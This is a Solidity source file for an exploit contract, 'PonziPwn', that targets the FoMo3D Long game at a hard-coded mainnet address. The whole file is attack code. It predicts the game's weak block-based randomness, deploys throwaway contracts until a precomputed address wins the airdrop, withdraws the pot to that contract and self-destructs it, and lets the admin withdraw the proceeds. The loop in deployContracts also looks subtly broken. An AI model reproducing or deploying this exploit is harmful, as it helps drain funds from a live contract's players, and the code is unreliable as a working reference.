pragma solidity ^0.4.24;

interface FoMo3DlongInterface {
    function airDropTracker_() external returns (uint256);
    function airDropPot_() external returns (uint256);
    function withdraw() external;
}

 
contract BlankContract {
    constructor() public {}
}

 
contract AirDropWinner {
     
    FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);
     
    constructor() public {
        if(!address(fomo3d).call.value(0.1 ether)()) {
           fomo3d.withdraw();
           selfdestruct(msg.sender);
        }

    }
}

contract PonziPwn {
    FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);
    
    address private admin;
    uint256 private blankContractGasLimit = 20000;
    uint256 private pwnContractGasLimit = 250000;
       
     
    uint256 private gasPrice = 10;
    uint256 private gasPriceInWei = gasPrice*1e9;
    
     
    uint256 private blankContractCost = blankContractGasLimit*gasPrice ;
    uint256 private pwnContractCost = pwnContractGasLimit*gasPrice;
    uint256 private maxAmount = 10 ether;
    
    modifier onlyAdmin() {
        require(msg.sender == admin);
        _;
    }

    constructor() public {
        admin = msg.sender;
    }

    function checkPwnData() private returns(uint256,uint256,address) {
         
        address _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, address(this), 0x01)));
        uint256 _nContracts = 0;
        uint256 _pwnCost = 0;
        uint256 _seed = 0;
        uint256 _tracker = fomo3d.airDropTracker_();
        bool _canWin = false;
        while(!_canWin) {
             
            _seed = uint256(keccak256(abi.encodePacked(
                   (block.timestamp) +
                   (block.difficulty) +
                   ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)) +
                   (block.gaslimit) +
                   ((uint256(keccak256(abi.encodePacked(_newSender)))) / (now)) +
                   (block.number)
            )));

             
             
            if((_seed - ((_seed / 1000) * 1000)) >= _tracker) {
                    _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, _newSender, 0x01)));
                    _nContracts++;
                    _pwnCost+= blankContractCost;
            } else {
                    _canWin = true;
                     
                    _pwnCost += pwnContractCost;
            }
        }
        return (_pwnCost,_nContracts,_newSender);
    }

    function deployContracts(uint256 _nContracts,address _newSender) private {
         
        for(uint256 _i; _i < _nContracts; _i++) {
            if(_i++ == _nContracts) {
               address(_newSender).call.value(0.1 ether)();
               new AirDropWinner();
            }
            new BlankContract();
        }
    }

     
    function beginPwn() public onlyAdmin() {
        uint256 _pwnCost;
        uint256 _nContracts;
        address _newSender;
        (_pwnCost, _nContracts,_newSender) = checkPwnData();
        
	 
        if(_pwnCost + 0.1 ether < maxAmount) {
           deployContracts(_nContracts,_newSender);
        }
    }

     
    function withdraw() public onlyAdmin() {
        admin.transfer(address(this).balance);
    }
}